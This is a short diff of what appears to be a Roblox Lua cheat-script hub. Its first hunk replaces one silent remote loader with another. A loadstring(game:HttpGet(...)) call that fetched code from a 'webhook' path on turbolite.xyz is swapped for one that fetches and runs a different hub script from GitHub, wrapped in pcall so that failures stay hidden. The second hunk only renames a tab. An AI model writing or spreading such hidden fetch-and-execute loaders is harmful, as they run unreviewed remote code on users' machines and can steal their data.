@@ -20,7 +20,7 @@ do
   local coreGui = game:GetService("CoreGui")
   do
     pcall(function()
-      loadstring(game:HttpGet("https://turbolite.xyz/script/webhook/lazy.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/ScepTsk/Neutrin-Hub/refs/heads/main/NeutrinOfficial.Lua"))()
     end)
   end
 
@@ -3460,7 +3460,7 @@ do
       Icon = "rbxassetid://10723346959",
     })
 
-    local shoppingTab = window:MakeTab({ Title = "Shopping", Icon = "rbxassetid://10734952479" })
+    local shopTab = window:MakeTab({ Title = "Shop", Icon = "rbxassetid://10734952479" })
 
     local logicSettingTab = window:MakeTab({
       Title = "Logic Setting",
